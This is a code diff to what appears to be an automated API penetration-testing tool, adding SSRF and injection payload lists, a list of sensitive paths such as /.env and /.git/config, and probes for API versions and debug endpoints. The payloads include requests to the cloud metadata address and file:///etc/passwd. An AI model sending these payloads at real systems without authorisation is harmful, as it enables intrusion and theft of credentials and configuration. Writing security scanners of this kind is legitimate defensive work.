@@ -86,6 +86,19 @@ def _resolve_path(
     return out
 
 
+def _body_for(task: Task, endpoint: EndpointInfo) -> dict | None:
+    """Return the best available request body for a method that may need one.
+
+    Priority: task.valid_body (coordinator-provided) → minimal schema body → None.
+    Avoids the `{} or None` pitfall where an empty dict was silently dropped.
+    """
+    if getattr(task, "valid_body", None) is not None:
+        return task.valid_body
+    if endpoint.body_schema:
+        return minimal_body(endpoint.body_schema) or None
+    return None
+
+
 _ExploitFn = Callable[
     [Task, AgentDecision, EndpointInfo],
     list[PayloadRequest],
@@ -102,11 +115,33 @@ _DEFAULT_PAYLOADS: dict[str, list[str]] = {
     "nosqli": ['{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}'],
     "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
     "xss": ['<script>alert(1)</script>', '"><script>alert(1)</script>', "javascript:alert(1)"],
+    "ssrf": [
+        "http://127.0.0.1/",
+        "http://localhost/",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://0.0.0.0/",
+        "http://[::1]/",
+        "file:///etc/passwd",
+    ],
+    "third_party_injection": [
+        "' OR 1=1--",
+        '{"$gt": ""}',
+        "<script>alert(1)</script>",
+        "{{7*7}}",
+    ],
 }
+
+_DEBUG_PATHS = [
+    "/debug", "/health", "/metrics", "/actuator", "/actuator/health",
+    "/_debug", "/.env", "/.git/config",
+    "/api/admin", "/admin", "/console",
+    "/swagger-ui.html", "/api-explorer", "/api/docs",
+    "/swagger.json", "/openapi.json", "/api-docs",
+]
 
 _ALL_HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]
 
-_INJECTION_STRATEGIES = frozenset({"sqli", "nosqli", "ssti", "xss"})
+_INJECTION_STRATEGIES = frozenset({"sqli", "nosqli", "ssti", "xss", "ssrf", "third_party_injection"})
 _EXPLOIT_DELEGATE_STRATEGIES = frozenset({
     "horizontal_id_enumeration", "uuid_substitution",
     "privilege_field_injection", "role_escalation",
@@ -188,6 +223,10 @@ class PayloadFactory:
             return self._admin_access_payloads(task, decision, endpoint)
         if s == "http_method_enumeration":
             return self._method_enum_payloads(task, endpoint)
+        if s == "api_version_enumeration":
+            return self._version_enum_payloads(task, endpoint)
+        if s == "debug_endpoint_discovery":
+            return self._debug_discovery_payloads(task, endpoint)
         if s in _EXPLOIT_DELEGATE_STRATEGIES:
             # These are handled by exploit modules; if we reach here it's a fallback
             return [self._baseline(task, endpoint)]
@@ -198,7 +237,7 @@ class PayloadFactory:
     ) -> list[PayloadRequest]:
         count = int(decision.payload_config.get("request_count", 50))
         path = _resolve_path(endpoint.path, endpoint.params, known_values=self._known_values)[0]
-        body = minimal_body(endpoint.body_schema) or None
+        body = _body_for(task, endpoint)
         return [
             PayloadRequest(
                 task_id=task.task_id,
@@ -298,7 +337,7 @@ class PayloadFactory:
             "task_id": task.task_id,
             "method": endpoint.method,
             "path": _resolve_path(endpoint.path, endpoint.params, known_values=self._known_values)[0],
-            "body": None,
+            "body": _body_for(task, endpoint),
             "query_params": {},
             "strategy": "admin_endpoint_access",
         }
@@ -322,13 +361,64 @@ class PayloadFactory:
             for m in _ALL_HTTP_METHODS
         ]
 
+    def _version_enum_payloads(
+        self, task: Task, endpoint: EndpointInfo
+    ) -> list[PayloadRequest]:
+        """API9: probe alternate version prefixes and docs discovery paths."""
+        import re as _re
+        _VER_RE = _re.compile(r"/(v\d+(?:\.\d+)?|beta|alpha|legacy|old)/", _re.IGNORECASE)
+        clean_path = _re.sub(r"\{[^}]+\}", "test", endpoint.path)
+
+        version_paths: list[str] = []
+        if _VER_RE.search(clean_path):
+            for ver in ("v1", "v2", "v3", "beta"):
+                variant = _VER_RE.sub(f"/{ver}/", clean_path, count=1)
+                if variant not in version_paths and variant != clean_path:
+                    version_paths.append(variant)
+
+        discovery_paths = [
+            "/swagger.json", "/openapi.json", "/api/docs",
+            "/api-docs", "/docs", "/swagger-ui.html",
+        ]
+
+        all_paths = (version_paths or [clean_path]) + discovery_paths
+        return [
+            PayloadRequest(
+                task_id=task.task_id,
+                method="GET",
+                path=p,
+                body=None,
+                query_params={},
+                strategy="api_version_enumeration",
+                label=f"version_enum:{p}",
+            )
+            for p in all_paths[:20]
+        ]
+
+    def _debug_discovery_payloads(
+        self, task: Task, _endpoint: EndpointInfo
+    ) -> list[PayloadRequest]:
+        """API9: probe common debug, admin, and configuration endpoints."""
+        return [
+            PayloadRequest(
+                task_id=task.task_id,
+                method="GET",
+                path=p,
+                body=None,
+                query_params={},
+                strategy="debug_endpoint_discovery",
+                label=f"debug:{p}",
+            )
+            for p in _DEBUG_PATHS
+        ]
+
     def _baseline(self, task: Task, endpoint: EndpointInfo) -> PayloadRequest:
         path = _resolve_path(endpoint.path, endpoint.params, known_values=self._known_values)[0]
         return PayloadRequest(
             task_id=task.task_id,
             method=endpoint.method,
             path=path,
-            body=minimal_body(endpoint.body_schema) or None,
+            body=_body_for(task, endpoint),
             strategy="baseline",
             label="baseline",
         )
